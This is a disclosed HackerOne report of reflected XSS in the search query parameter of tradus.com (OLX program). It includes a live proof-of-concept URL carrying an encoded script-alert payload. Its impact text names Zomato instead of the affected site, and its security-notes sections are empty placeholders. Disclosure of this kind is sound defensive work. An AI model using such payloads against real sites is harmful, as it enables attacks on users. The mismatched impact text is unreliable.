---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '429647'
original_report_id: '429647'
title: XSS Reflected at SEARCH >>
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: olx
created_at: '2018-10-27T11:47:34.651Z'
disclosed_at: '2018-12-08T09:59:15.068Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 18
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS Reflected at SEARCH >>

## Metadata

- HackerOne Report ID: 429647
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: olx
- Disclosed At: 2018-12-08T09:59:15.068Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I have Found XSS payload avaliable at GET Request..

Live PoC URL:

https://www.tradus.com/en/s/braem-used-parts/make-man+mercedes-benz+zf+other+fuller/location-belgium+netherlands+germany+poland+denmark+france+united-kingdom+spain+sweden+italy+austria+finland+norway+ukraine+russia+czechia+greece+romania+hungary+portugal+belarus+switzerland+slovakia+united-arab-emirates+bulgaria+lithuania+ireland+latvia+turkey+croatia+estonia+vietnam+bosnia-herzegovina+slovenia+india+china+andorra+iceland+macedonia+mongolia+united-states+brazil+hong-kong-sar-china+israel+serbia/pricetype-fixed+upon-request/?query=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E&year_from=09&year_to=09&price_from=1234&price_to=1234

Tested with old version Firefox, where avaliable and disable XSS filter.

## Impact

Impact

This allows an attacker to inject custom Javascript codes that can be used to steal information from Zomato's user base and lure them to malicious websites on the internet on behalf of Zomato's website.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
